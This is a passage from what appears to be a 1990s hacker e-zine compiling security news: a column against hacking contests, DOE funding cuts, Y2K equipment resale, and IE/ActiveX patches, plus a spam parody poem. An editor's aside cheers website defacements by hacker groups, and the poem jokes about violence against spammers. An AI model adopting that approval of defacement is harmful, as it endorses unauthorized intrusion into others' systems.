      There are provisions to make Windows NT a very secure operating system,
      such as privilege levels in separate user accounts, file permissions and kernel
      object access control lists. 

      You have to make 300-plus security checks and modifications to Windows NT
      to make it secure. Microsoft refuses to ship the [operating system] in that
      condition. 

      Malicious remote administration tools are a major security risk. What Back
      Orifice has done is made mainstream computer users aware of the danger.
      There are certainly other similar tools in thehacker world -- one, called
      BackDoor-G, has recently been discovered -- some developed with much
      more sinister purposes in mind. 

      Microsoft responds to security threats only if they are demonstrated. Explain
      the threat in an academic paper and Microsoft denies it; release a hacking tool
      like Back Orifice and suddenly they take the vulnerability seriously.

60.0  WHY HACKING CONTESTS ARE A BAD IDEA

      Why Hacking Contests Are
      a Bad Idea
 
      Contests that encourage people to
      hack are not a good way to test an OS.
      By Ira Winkler  October 4, 1999 
 
      When ZDTV informed me of a hacker
      contest being sponsored by PC Week, I
      thought it was a joke. Yet after visiting
      the site, I'm not laughing. There are so
      many reasons why this test is a bad idea.
      Many people, however, might think that a
      hacker contest is the only way to
      thoroughly check the security of a
      system. 
 
      The logic, as
      stated on the
      PC Week
      website, was to
      definitively
      determine which
      of the two
      operating
      systems is more
      secure: Windows NT or Unix. According to
      the stated logic, there is no better way to
      determine security than by having
      everyone in the world try to break into
      the systems. Of course, the less secure
      system would fall first. To make sure that
      PC Week attracted the best talent in the
      world to take part in this test, the
      contest organizers offered a $1,000
      reward. To a layperson, this may make
      sense. 
 
      There is much more to security than just
      the operating system. There are two
      basic methods for breaking into a
      computer.
 
        1.Exploit problems built into the
           underlying operating system and
           applications.
        2.Exploit problems with the way that
           administrators and users configure,
           manage, and use the system.
 
      To first assume that hacking tests are
      valid, the systems must be configured
      perfectly. That in itself is asking a lot. 
      
      In Search of Security
 
      Then you have to assume that the
      applications that were used to provide the
      Web functionality are also secure. After
      all, you are asking to decide if Windows
      NT is a good platform-- not if Windows NT
      with a specific Web server application is
      secure. If there is an exploitation that
      compromises the server application, it
      doesn't mean that the operating system is
      the problem. 
 
      The next problem is with the Unix/Linux
      side of the test. There are many different
      versions of Unix and Linux. Just because
      there might be a weakness in Red Hat
      Linux, for example, doesn't mean that all
      other versions of Linux have that
      weakness. 
 
      Next you have to look at the goal of the
      test. If the goal is to have someone break
      into a site and manipulate the webpages,
      that is one issue. But what happens if
      someone takes the system down? A Denial
      of Service attack could be more
      devastating than if someone actually
      broke in and modified webpages. In theory
      a person who has broken into a system
      can do both, however taking a system
      down is bad enough. 
 
      Probably what is most surprising is that
      the PC Week Linux system was "hacked"
      first. According to the rules of the "test,"
      this means that Windows NT is more
      secure than Linux. I don't know any
      security professional who would buy that
      argument. And I doubt that Microsoft will
      now start telling people that NT is more
      secure than Linux, based on this "test." 
 
      There are many other reasons, from a
      technical perspective, as to why this is a
      bad test. However I should reserve some
      space for the logistical perspective of
      using "hackers" to test security. 
      
      Eyes on the Prize
 
      Although the contest organizers at PC
      Week probably believe that $1,000 is
      enough to attract the attention of the
      best hackers in the world, $1,000 is not
      nearly enough to attract the attention of
      the more competent hackers. Talented
      security people, whom PC Week expects
      to attract to the test, can earn as much
      as $2,000 a day in consulting rates.
      Additionally there have been other "hacker
      challenges." These challenges were set up
      in an unrealistic manner, and the way to
      collect the "prize" required more effort
      than it was worth. Past hacker challenges
      have discouraged the better hackers. 
 
      Another issue is that you have to assume
      that everyone has heard about this test.
      Although there may have been some talk
      about the challenge on some online
      forums, this test has definitely not made
      the rounds. 
 
      Probably the most serious of the problems
      is that there is no right way to define
      "The Most Secure Operating System."
      However, the most agreed-upon way to
      examine security is by looking at the
      source code of the operating system.
      Microsoft is not about to divulge the
      source code to PC Week for a detailed
      examination of Windows NT security. 
 
      So, what is the most secure operating
      system? It is simply the system that you
      can maintain best. Even if you could
      identify the most secure operating
      system, it will only be secure as long as it
      is properly configured, maintained, and
      used. 
 
      Therefore, the most potentially secure
      operating system is the one that you
      know best. For example, if your
      organization has administrators who are
      real NT experts, you would be a fool to
      use an unfamiliar operating system for no
      other reason than you think it is more
      secure. Likewise, people would be fools to
      turn away from Linux, because it was the
      first system hacked in the PC Week test.
      I have seen very secure NT websites,
      because they were well maintained. I
      have also seen very unsecure NT
      websites because they were poorly
      maintained. PC Week would better serve
      its readers by testing administrator
      training programs rather than operating
      systems.
      
      Postscript
 
      As the PC Week security test progresses,
      it continues to show why the test isn't
      the greatest idea. First there is an issue
      that I didn't want to point out in the
      original column. 
 
      About a year ago, I helped
      ComputerWorld organize a test of
      firewalls that would have been similar in
      nature to this hacker challenge. One of
      the first issues we considered was that if
      we opened up the test to everyone,
      people might get bored with hacking the
      test system and turn their attention to
      ComputerWorld's operating systems.
      The people at ComputerWorld decided
      that this was a very real threat and
      decided against an open challenge. 
 
      Now, a series of posts on the PC Week
      Security Forum openly recommend or
      encourage the hacking of the
      Ziff-Davis-owned site as an extension of
      this test. Whether or not people actually
      go after the Ziff-Davis site is one story,
      but a little forethought would have been
      wise. 
 
      The second issue to consider is what as I
      stated in the original column, the system
      must be configured securely by the
      administrators before a test can be
      deemed valid. It appears that the Linux
      hack was a result of a cgi scripting
      program as well as an unapplied patch (or
      security fix). Both of these are
      configuration issues and the result of
      administration practices, not the
      underlying software. Again I would
      recommend that administrator training
      programs be tested, if you want a really
      useful security-related test.

61.0 NO $35 MILLION FOR DOE CYBER SECURITY

     DOE Loses $35 Million for Cyber Security 

    
     By Walter Pincus and Vernon Loeb, Washington Post
     WASHINGTON DC, U.S.A., 
     29 Sep 1999, 9:03 AM CST

     The Senate yesterday passed an energy appropriations bill that omits $35 million requested by Energy
     Secretary Bill Richardson for increased computer security. The money was eliminated despite months of
     heated debate over suspected Chinese espionage, during which leading Republicans accused the Clinton
     administration of foot-dragging on security. 

     Richardson, traveling overseas, issued a statement charging that Congress was withholding "important tools needed to
     implement security reform" that Congress itself had demanded. 

     Without the $35 million, Richardson said, "it will be impossible to provide real-time cyber intrusion detection and protection
     for 70 Energy Department sites." 

     The money was eliminated by a House-Senate conference reconciling differences between the initial versions of the bill
     passed by the two chambers. A member of the conference committee, who requested anonymity, said the $35 million was
     eliminated because members "want to see management reform" before they approve a huge funding increase. 

     The committee member noted that Richardson is developing a $450 million cyber security proposal for fiscal 2001. It would
     include money to replace all personal computers used in classified programs with machines that do not have floppy disk
     drives, and thus cannot easily be downloaded. 

     Congress's action leaves the department with the $2 million it originally sought for computer security before suspected
     Chinese espionage came to dominate political debate in Washington last spring. 

     Cyber security, in particular, became a major concern after it was discovered that the government's prime espionage
     suspect at the Los Alamos National Laboratory, Chinese American physicist Wen Ho Lee, had downloaded classified
     information to his unclassified computer. Lee, who denies passing secrets to China, was fired but has not been charged
     with any crime. 

     Meanwhile, the Energy Department's director of counterintelligence, Edward J. Curran, acknowledged yesterday that he
     recommended his brother, a retired police detective, for a $70-an-hour temporary job reviewing counterintelligence
     operations at the department's three nuclear weapons laboratories. 

     But he said the department's inspector general determined that his recommendation did not violate federal
     conflict-of-interest statutes. "I recommended my brother, yes, but he does not work directly for me," Curran said. 

     Michael Curran, a veteran of 27 years as a detective for the Waterfront Commission of New York Harbor, has participated in
     a two-week counterintelligence inspection at Lawrence Livermore Laboratory National Laboratory in California and is now
     part of a nine-member team reviewing security at the Los Alamos lab in New Mexico. 

     All told, he will work about six weeks this fall, Edward Curran said, and will participate in additional counterintelligence
     inspections at Energy Department facilities next year.

     DOD resold non-Y2K compliant computers,
     medical devices

     BY DANIEL VERTON (dan_verton@fcw.com)

     The Defense Department donated or sold hundreds of thousands of
     computers, medical devices and other electronic equipment to state and local
     agencies, hospitals and other public institutions that could fail to operate because
     of Year 2000 problems.

     In a report released this week, the Pentagon's inspector general found that
     many of the 340,000 excess medical devices and 77,900 excess computer
     systems donated or sold by DOD between Oct. 1, 1998, and March 31, 1999,
     may not have been Year 2000-compliant and could fail to operate properly after
     Dec. 31. 

     "The medical property included devices critical to health and safety, such as
     anesthesia apparatus, fetal heart monitors and X-ray equipment," the report
     stated. However, auditors admitted that the list of 340,000 medical devices also
     included many items that are not deemed critical to public health and safety and
     do not rely on date-dependent computer microchips.

     In one case, the Naval Medical Center in Portsmouth, Va., transferred 9,000
     pieces of equipment to the Defense Reutilization and Marketing Service -- the
     DOD agency responsible for disbursing equipment that is no longer needed --
     for sale or donation to other institutions without assessing any of them for
     potential Year 2000 problems.

     In fact, of the 9,000 items cited, 2,000 posed a high or medium health risk, the
     report stated. According to the IG, plans called for these items to be transferred
     or sold to the DOD Humanitarian Assistance Program, the Indian Health
     Service, state and local agencies and the general public.

     In addition to medical devices, the Defense Information Systems Agency and
     the Defense Logistics Agency sold or donated more than 77,900 pieces of
     computer equipment to various federal, state and local law enforcement
     agencies that also may be at risk of Year 2000 failures.

     "DISA did not notify recipients that equipment may not be Y2K compliant or
     provide a disclaimer that equipment was made available without warranty for
     fitness of use," the IG report stated. The equipment transferred to law
     enforcement agencies included various communications security and cryptologic
     devices, radio navigation equipment and electronic countermeasures equipment.

     In his response accompanying the report, Marvin Langston, DOD's deputy chief
     information officer, said the department agrees with the findings of the IG report
     and is changing the its Year 2000 Management Plan to address the disposal of
     Year 2000-sensitive equipment. "Because of the potential risk to the general
     public, this document also addresses biomedical equipment turned in to the
     Defense Reutilization and Marketing Service," Langston said.

     However, Rear Adm. E.R. Chamberlin, deputy director of DLA, which
     oversees the various DRMS facilities throughout DOD, said the IG report
     "exaggerates" the Year 2000 risks associated with excess and surplus
     equipment, particularly medical equipment. 

     "We offer excess and surplus equipment on an 'as is, where is' basis, with no
     express or implied warranties for fitness of use," Chamberlin said. "DLA
     reviewed medical items [in the categories audited] and only .2 percent were
     found to have an embedded chip and none to be date-sensitive," he said.

      Sheriff's Opinion: Free
      Speech or Illegal Posting?

      A Florida law enforcement official
      posts message on government site
      blasting gays, abortion, and the ACLU.
      September 27, 1999 


      A Florida sheriff is
      using an official
      government
      website to espouse
      his views on
      abortion, school
      prayer, and the "moral corruption" brought
      by various social groups and
      organizations. 

      The message, written as a letter by
      Sheriff John J. McDougall, is posted on the
      Lee County Sheriff's Office website. It
      lambastes homosexuals, feminists,
      atheists, Planned Parenthood, and the
      American Civil Liberties Union, among
      others. 

      Because McDougall's message is posted
      on a site that is apparently taxpayer
      supported, his words have sparked debate
      about whether the message constitutes
      protected free speech or an illegal use of
      government property to express personal
      views. However, there is currently no law
      to force McDougall to pull his message
      down. 

      In the letter, McDougall says he strongly
      opposes the elimination of Catholic prayer
      in public schools. He urges America to
      "wake up" and fight against "...the
      diabolical forces of moral corruption
      working feverishly behind closed doors."
      He cites as culprits "the gay and lesbian
      coalitions, rabid feminist groups, United

      Microsoft has patched a handful of security holes in its Internet Explorer browser and
      ActiveX technology that made computers vulnerable to attack by malicious Web site
      operators. The nice folks at Cnet were kind enough to put them together for us one
      more time (the last hopefully.. nah :). More info

      Microsoft patches Internet Explorer, ActiveX holes 
      By Paul Festa

      Microsoft has patched a handful of security holes in its Internet Explorer browser and ActiveX technology that made
      computers vulnerable to attack by malicious Web site operators.
 
      The first patch takes care of a problem with IE's ImportExportFavorites feature, which lets users tranfer lists of frequently visited
      Web addresses. The bug lets a malicious Web site operator run executable code on the computer of someone who visits that
      Web site.
 
      "The net result is that a malicious Web site operator potentially could take any action on the computer that the user would be
                            capable of taking," Microsoft warned in a security alert earlier this month.
 
                            Microsoft's patch eliminates the problem, the company said today. Versions 4.01 and 5.0 of IE are
                            at risk. The patch also fixes a related problem involving ActiveX, Microsoft's technology for bringing
                            interactive scripts and controls to Web pages.
 
                            ActiveX has long been a security headache for Microsoft. Critics of the technology fault its
                            "trust-based" security model, in which signatures let users choose whether to download an ActiveX
                            control. With this system, users are expected to judge that controls signed by well-known
                            companies like Microsoft are less likely to be maliciously designed than those signed by unknown
                            entities.
 
                            In the latest discovery, Microsoft identified eight ActiveX controls it said were "incorrectly marked as
                            'safe for scripting,'" a designation that assures users that they can download the controls without
                            posing any security risk to their own computers. The controls could be manipulated for malicious
      ends, however, Microsoft said.
 
      The controls in question are Kodak Image Edit: Wang Imaging; Kodak Image Annotation: Wang Imaging; Kodak Image Scan:
      Wang Imaging; Kodak Thumbnail Image: Wang Imaging; Wang Image Admin: Wang Imaging; HHOpen: HTML help files;
      Registration Wizard: Internet Explorer Product Registration; and IE Active Setup: Internet Explorer Setup.
 
      Microsoft credited Bulgarian bug hunter Georgi Guninski with discovering the so-called ImportExportFavorites bug. Richard Smith
      of Pharlap Software and Australian bug hunter Shane Hird were recognized for discovering the ActiveX problems.

       Subject: Green eggs and spam
       From: h-a-v-o-c@v-o-y-a-g-e-r.removedashes.net (Bill Rogers)
       Newsgroups: news.admin.net-abuse.email
      
       Wrote something like this a year or so ago but I don't think I ever
       had the guts to post it.
      
       Green Eggs and Spam
      
       I love spam.
       I'm Spammerman.
       Won't you read my email spam?
      
           I will not read your email spam.
           Please don't disturb me, Spammerman.
      
       Will you read it in the street?
       Don't you think this stock is neat?
       Don't you want some kiddie porn
       And if you don't, just hit delete?
      
           I will not read it in the street.
           You're nuts to think I'll just delete.
           Your kiddie porn is sad and sick
           I'd like to beat you with a stick!
           Your stock is just a sleazy scam
           I do not LIKE you, Spammerman.
      
       Will you read it on the beach?
       Will you help support Free Speach?
       You're in the wrong if you complain.
       Murkowski says so, clear and plain.
      
           I will not read it on the beach.
         And by the way, it's spelled Free Speech
         My email's packed with worthless stuff
         And still you think there's not enough!
         Just go to hell, that's what to do,
         And take that hack Murkowski too!
         I'll never read your email spam.
         It's wrong and evil, Spammerman!
      
      Will you buy my book that's next
      About the secrets of male sex?
      Or buy a set of plans from me
      To steal your cable shows for free?
      
         I will not buy that book from you
         For I've no need.. perhaps YOU do!
         I will not steal my cable shows.
         Perhaps I could, but you should know
         That I am HONEST, Spammerman.
         That's something you can't understand.
      
       Will you please Make Money Fast?
       just send your money to the last
       Address upon this list of four.
       And what are you all hostile for?
       I've this Remove List that I share.
       It's worse than useless, but it's there!
      
           I won't fall for Make Money Fast
           So you can ram it up your rectal cavity,
           And please don't think my wits are failing
           At this twelve thousandth "one time mailing,"
           That I'd get on a "remove list"
           That makes spam grow and not desist.
           But give your real address to me
           And we shall see what we shall see.
      
       Oh goody!  Send your unmarked bills
       My bedroom's in Suburban Hills
       But if there's noise you'll start a fight.
       My mom works on the streets at night
       And Dad is sleeping off his wine.
       So tell the postman "Choose your time,
       And leave the cash in silent stealth."
       Oh good!  I've finally made some wealth!
      
          Hey, Spammerman!  I've found your place.
          It's good to see your zit-pocked face
          I'd like to tell you that I still
          Don't read your spam and never will.
          I will not read, I will not buy,
          I think that those who spam should die!
          So NEVER spam me any more.
          The end.  That's what I came here for.
          Oh, who are all these other friends?
          Well, just to help you make amends
          For all the spamming that you've done,
          I've brought your ISP, for one,
          To cancel your account for you
          And maybe break your kneecaps, too!
          And here are Agents One and Two
          Of FBI, to talk to you
          About the kiddie porno laws
          And when they're done, without a pause
          The Post Inspection Service here
            Would like to make it plainly clear
            "Make Money Fast" is not legit
            No matter what you claim for it.
            And since it's chilly where you are
            Ten thousand Netizens brought tar
            And warming feathers, and a rail
            To give you a free ride to jail.
            So have a happy, spammy day!
            And with these words, he walked away.

      The Hackers Anti-Defamation league
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      Here's a site that most people should be aware of and try and visit, its a good way of getting
      your feelings across if nothing else...
      
      
      From the site, almost verbatim;
      
      The Hacker Anti-Defamation League

      Since the early 80's, the press has used the term "hacker" to mean a malicious security breaker,
      someone who likes to break into computer systems for fun. This is not a
      hacker at all. This is in fact a cracker. 

      Hackers rather, are people who like to break out of boundaries and find solutions to problems. 
      Hackers not only exist in the software community, they are musicians, engineers, artists. You can
      find hackers in almost any field. Here, we discuss mainly the software hacker: a person who enjoys
      programming and exploring computers. 

      Hackers are the people who built the internet. They created Unix. They made the world wide web work.
      Without the work of hackers you wouldn't be viewing this page today, and I wouldn't have written it.
      The modern world owes a lot to hackers. 

      As a matter of fact, here are the definitions of hacker and cracker as defined by RFC 1983: 

      cracker


      A cracker is an individual who attempts to access computer systems without authorization. These 
      individuals are often malicious, as opposed to hackers, and have many means at their disposal for
      breaking into a system. See also: hacker, Computer Emergency Response Team, Trojan Horse, virus, 
      worm. 

      hacker
      
      A person who delights in having an intimate understanding of the internal workings of a system, 
      computers and computer networks in particular. The term is often misused in a pejorative context,
      where "cracker" would be the correct term. See also: cracker.

      Note: The hacked site reports stay, especially with some cool hits by
            groups like *H.A.R.P, go get em boyz racism is a mugs game! - Ed

      http://frey.rapidnet.com/~ptah/ for 'the story so far'...
      
      Hacker groups breakdown is available at Attrition.org
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      check out http://www.attrition.org/mirror/attrition/groups.html to see who
      you are up against. You can often gather intel from IRC as many of these
      groups maintain a presence by having a channel with their group name as the
      channel name, others aren't so obvious but do exist.

      The 'lpaz' hack is interesting. No elite speak, no cussing. A seemingly
